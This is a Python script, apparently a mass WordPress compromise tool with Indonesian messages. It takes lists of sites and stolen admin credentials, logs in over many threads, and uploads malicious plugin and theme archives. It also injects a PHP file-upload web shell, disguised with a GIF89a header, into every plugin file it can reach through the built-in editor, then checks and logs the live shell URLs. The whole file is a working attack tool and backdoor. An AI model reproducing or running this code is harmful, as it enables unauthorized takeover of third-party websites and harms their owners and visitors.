import os
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
import time
import random
import re
from colorama import Fore, init, Style

init(autoreset=True)
g = Fore.GREEN + Style.BRIGHT
res = Style.RESET_ALL
wh = Fore.WHITE + Style.BRIGHT


PLUGIN_FILE = "plugin-inmymine.zip"
THEME_FILE = "theme-inmymine.zip"
SUCCESS_PLUGIN = "plugin.txt"
SUCCESS_THEME = "theme.txt"
FAILED = "failed.txt"

banner = f"""{g}

 █     █░ ██▓███   █    ██  ██▓███    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█░ █ ░█░▓██░  ██▒ ██  ▓██▒▓██░  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒█░ █ ░█ ▓██░ ██▓▒▓██  ▒██░▓██░ ██▓▒░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
░█░ █ ░█ ▒██▄█▓▒ ▒▓▓█  ░██░▒██▄█▓▒ ▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░░██▒██▓ ▒██▒ ░  ░▒▒█████▓ ▒██▒ ░  ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ▒ ░ ░  ░▒ ░     ░░▒░ ░ ░ ░▒ ░     ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░   ░  ░░        ░░░ ░ ░ ░░       ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
    ░                ░                    ░   ░  ░  ░   ░  ░    ░  ░    ░  ░ v1.0
{wh}[{g}+{wh}] Coded By '/Mine7  
{wh}[{g}+{wh}] github.com/InMyMine7 
{wh}[{g}+{wh}] t.me/minsepen {res}
"""
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def random_name():
    let = "abcdefghijklmnopqrstuvwxyz1234567890"
    return ''.join(random.choice(let) for _ in range(8))

def parse_line(line):
    try:
        site, creds = line.strip().split('#', 1)
        username, password = creds.split('@', 1)
        return site, username, password
    except Exception as e:
        print(f"[ERROR] Format error: {line.strip()} ({e})")
        return None, None, None

def verify_shell(url):
    try:
        resp = requests.get(url, timeout=10)
        if any(x in resp.text for x in ["InMyMine7", "Priv8 Uploader", "<form", "Upload"]):
            return True
        return False
    except Exception as e:
        print(f"[ERROR] Verifikasi shell gagal: {e}")
        return False

def login(session, site, username, password):
    try:
        login_page = session.get(site, timeout=10)
        if login_page.status_code != 200:
            return False

        soup = BeautifulSoup(login_page.text, 'html.parser')
        redirect = soup.find("input", {"name": "redirect_to"})

        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": redirect["value"] if redirect else site.replace("wp-login.php", "wp-admin/"),
            "testcookie": "1"
        }

        response = session.post(site, data=data, timeout=10)
        return "Dashboard" in response.text or "wp-admin" in response.url
    except Exception as e:
        print(f"[ERROR] Login exception: {e}")
        return False

def upload_file(session, site, file_path, file_type):
    try:
        if file_type == "plugin":
            form_url = site.replace("wp-login.php", "wp-admin/plugin-install.php?tab=upload")
            post_url = site.replace("wp-login.php", "wp-admin/update.php?action=upload-plugin")
            content_folder = "wp-content/plugins/"
            output_file = SUCCESS_PLUGIN
        else:
            form_url = site.replace("wp-login.php", "wp-admin/theme-install.php?tab=upload")
            post_url = site.replace("wp-login.php", "wp-admin/update.php?action=upload-theme")
            content_folder = "wp-content/themes/"
            output_file = SUCCESS_THEME

        resp = session.get(form_url, timeout=10)
        if resp.status_code != 200:
            return False

        soup = BeautifulSoup(resp.text, 'html.parser')
        nonce_field = soup.find("input", {"name": "_wpnonce"})
        if not nonce_field:
            return False
        nonce = nonce_field.get("value")

        random_filename = random_name() + ".zip"
        files = {
            'pluginzip' if file_type == "plugin" else 'themezip': (random_filename, open(file_path, 'rb')),
        }
        data = {
            '_wpnonce': nonce,
            '_wp_http_referer': form_url.replace(site.split('/wp-login.php')[0], ''),
            'install-plugin-submit' if file_type == "plugin" else 'install-theme-submit': 'Install Now'
        }

        response = session.post(post_url, files=files, data=data, timeout=20)

        if "successfully" in response.text.lower():
            site_base = site.replace('/wp-login.php', '').rstrip('/')
            name = os.path.splitext(random_filename)[0]
            full_url = urljoin(site_base + '/', content_folder + name + '/install.php')

            if verify_shell(full_url):
                print(f"[SUCCESS] {file_type.capitalize()} berhasil di-upload dan aktif di {full_url}")
                with open(output_file, 'a') as f:
                    f.write(f"{full_url}\n")
                return True
            else:
                print(f"[FAILED] {file_type.capitalize()} berhasil di-upload tapi tidak terverifikasi di {full_url}")
                return False

        if "already exists" in response.text:
            print(f"[INFO] {file_type.capitalize()} sudah terpasang di {site} — tidak ditimpa")
        else:
            print(f"[FAILED] Gagal upload {file_type} ke {site}")

        return False

    except Exception as e:
        print(f"[ERROR] Upload {file_type} error for {site}: {e}")
        return False

def inject_plugin_editor(session, site):
    try:
        print(f"[INFO] Inject via plugin editor di {site}...")
        base_url = site.replace("wp-login.php", "")
        editor_url = base_url + "wp-admin/plugin-editor.php"

        resp = session.get(editor_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")

        plugin_select = soup.find("select", {"name": "plugin"})
        if not plugin_select:
            print("[FAILED] Tidak menemukan dropdown plugin")
            return False

        plugin_options = plugin_select.find_all("option")

        for option in plugin_options:
            plugin_value = option.get("value")
            if not plugin_value or "/" not in plugin_value:
                continue

            plugin_slug = plugin_value.split("/")[0]
            file_path = plugin_value
            full_url = f"{editor_url}?file={file_path}&plugin={plugin_value}"

            file_resp = session.get(full_url, timeout=10)
            file_soup = BeautifulSoup(file_resp.text, "html.parser")

            nonce_input = (
                file_soup.find("input", {"id": "_wpnonce"})
                or file_soup.find("input", {"id": "nonce"})
                or file_soup.find("input", {"name": "_wpnonce"})
                or file_soup.find("input", {"name": "nonce"})
            )
            textarea = file_soup.find("textarea", {"id": "newcontent"})

            if not nonce_input or not textarea:
                continue

            nonce = nonce_input.get("value")
            original = textarea.text
            shell_code = """
GIF89a; <?php 
if ($_GET[''] == ''){
    echo '<pre><p>Priv8 Uploader By InMyMine7</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
}
?>

"""

            if shell_code in original:
                continue

            new_code = shell_code + "\n" + original

            post_data = {
                "nonce": nonce,
                "_wp_http_referer": f"/wp-admin/plugin-editor.php?file={file_path}&plugin={plugin_value}",
                "newcontent": new_code,
                "action": "update",
                "file": file_path,
                "plugin": plugin_value,
                "submit": "Update File"
            }

            post_resp = session.post(editor_url, data=post_data, timeout=10)

            if "File edited successfully" in post_resp.text or "berhasil diperbarui" in post_resp.text.lower():
                shell_url = f"{base_url}wp-content/plugins/{plugin_slug}/{file_path.split('/')[-1]}"
                if verify_shell(shell_url):
                    print(f"[SUCCESS] Plugin berhasil di-inject dan aktif di {shell_url}")
                    with open(SUCCESS_PLUGIN, 'a') as f:
                        f.write(f"{shell_url}\n")
                    return True
                else:
                    print(f"[FAILED] Plugin berhasil di-inject tapi tidak terverifikasi di {shell_url}")
                    return False
            else:
                print(f"[DEBUG] Gagal inject plugin {plugin_value}")

        print("[FAILED] Tidak ada plugin yang berhasil diinjeksi")
        return False

    except Exception as e:
        print(f"[ERROR] Inject plugin editor error: {e}")
        return False

def process_site(line):
    site, username, password = parse_line(line)
    if not site:
        return

    session = requests.Session()
    site_base = site.replace('/wp-login.php', '').rstrip('/')
    session.headers.update({
        'User-Agent': 'iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1)',
        'X-Target-Site': site_base
    })

    print(f"[INFO] Mencoba login ke {site}...")

    if not login(session, site, username, password):
        print(f"[FAILED] Login gagal ke {site}")
        with open(FAILED, 'a') as f:
            f.write(f"{site}#login_failed\n")
        return

    print(f"[INFO] Login berhasil ke {site}")
    success = False

    # Upload plugin
    if os.path.exists(PLUGIN_FILE):
        if upload_file(session, site, PLUGIN_FILE, 'plugin'):
            success = True

    # Upload theme
    if os.path.exists(THEME_FILE):
        if upload_file(session, site, THEME_FILE, 'theme'):
            success = True

    # Inject via plugin editor
    if inject_plugin_editor(session, site):
        success = True

    if not success:
        with open(FAILED, 'a') as f:
            f.write(f"{site}#upload_failed\n")

def main():
    clear()
    print(banner)
    input_file = input("Masukkan nama file list URL (contoh: list.txt): ").strip()
    thread_count = int(input("Masukkan jumlah thread: "))

    if not os.path.exists(input_file):
        print("File tidak ditemukan.")
        return

    with open(input_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    print(f"\n🚀 Mulai upload ke {len(lines)} site dengan {thread_count} thread...\n")
    start = time.time()

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        executor.map(process_site, lines)

    end = time.time()
    print(f"\n✅ Selesai dalam {end - start:.2f} detik.")
    print("📄 Hasil disimpan ke plugin.txt, theme.txt, dan failed.txt")

if __name__ == "__main__":
    main()
